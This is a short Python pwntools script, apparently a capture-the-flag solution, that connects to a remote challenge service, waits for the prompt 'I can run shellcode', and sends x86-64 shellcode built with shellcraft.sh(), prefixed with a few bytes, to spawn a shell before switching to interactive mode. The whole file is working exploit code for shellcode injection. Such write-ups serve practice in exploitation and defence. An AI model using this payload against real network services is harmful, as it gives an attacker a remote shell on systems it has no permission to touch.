from pwn import *
# p = process('./runner')
p=remote('ctf.v50to.cc',10253)
context.log_level='debug'
context.arch = 'amd64'

# gdb.attach(p,'b *$rebase(0x000000000000136C)')
pause()
p.recvuntil(b'I can run shellcode\n')
payload = asm(shellcraft.sh())
p.sendline(b'\x68\x00\x00\x00\x00'+payload)
p.interactive()